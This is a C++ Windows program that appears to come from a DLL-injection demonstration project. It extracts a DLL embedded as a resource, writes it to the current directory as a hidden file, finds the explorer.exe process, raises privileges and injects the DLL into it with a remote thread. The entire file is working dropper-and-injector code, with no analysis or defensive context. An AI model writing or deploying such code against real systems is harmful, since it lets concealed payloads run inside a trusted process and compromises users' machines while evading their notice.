#include "auxiliary.h"
#include "resource.h"

void LoadResource(wchar_t* pszLibFile)
{
	
	DWORD error = 0;
	DWORD dwWritten = 0;
	HMODULE hInstance = ::GetModuleHandle(NULL);
	HRSRC hServiceExecutableRes = ::FindResource(
		hInstance,
		MAKEINTRESOURCE(IDR_RELEASE_DLL1),
		L"RELEASE_DLL"
		);
	if (NULL == hServiceExecutableRes)
	{
		error = GetLastError();
		printf("getlasterror:[%d]\n", error);
	}

	HGLOBAL hServiceExecutable = ::LoadResource(
		hInstance,
		hServiceExecutableRes
		);
	if (NULL == hServiceExecutable)
	{
		error = GetLastError();
		printf("getlasterror:[%d]\n", error);
	}
	LPVOID pServiceExecutable = ::LockResource(hServiceExecutable);
	if (NULL == pServiceExecutable)
	{
		error = GetLastError();
		printf("getlasterror:[%d]\n", error);
	}
	ULONG nResSize = ::SizeofResource(NULL, hServiceExecutableRes);
	if (nResSize <= 0)
	{
		error = GetLastError();
		printf("getlasterror:[%d]\n", error);
	}

	

	//CString strPath = _T("");
	//strPath.Format("%s\\%s", theApp.GetMoudulePath(), "SocketDll.dll");

	HANDLE hFileServiceExecutable = ::CreateFile(
		pszLibFile,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_HIDDEN | FILE_FLAG_WRITE_THROUGH,
		NULL
		);
	if (hFileServiceExecutable == INVALID_HANDLE_VALUE)
	{
		error = GetLastError();
		printf("getlasterror:[%d]\n", error);
	}

	BOOL D = ::WriteFile(hFileServiceExecutable, pServiceExecutable, nResSize, &dwWritten, NULL);
	if (D == FALSE){
		error = GetLastError();
		printf("getlasterror:[%d]\n", error);
	}
	::CloseHandle(hFileServiceExecutable);
	return;
}

DWORD wmain()
{
	wchar_t* pszLibFile = NULL;
	wchar_t* strProcName = NULL;
	DWORD dwProcessId = 0;

	pszLibFile = (wchar_t*)malloc((MAX_PATH + 1) * sizeof(wchar_t));
	GetCurrentDirectory(MAX_PATH, pszLibFile);
	::wsprintf(pszLibFile, L"%ws\\%ws", pszLibFile, L"dll.dll");
	LoadResource(pszLibFile);
	//printf("%ws\n", pszLibFile);
	//system("pause");
	strProcName = (wchar_t*)malloc((MAX_PATH + 1) * sizeof(wchar_t));
	wcscpy_s(strProcName, MAX_PATH, L"explorer.exe");

	//printf("processname = [%ws]\n", strProcName);
	dwProcessId = findPidByName(strProcName);
	//printf("processid = [%d]\n", dwProcessId);
	
	if (dwProcessId == 0)
	{
		wprintf(TEXT("[-] Error: Could not find PID (%d).\n"), dwProcessId);
		return(1);
	}

	SetSePrivilege();
	demoCreateRemoteThreadW(pszLibFile, dwProcessId);

	return(0);
}
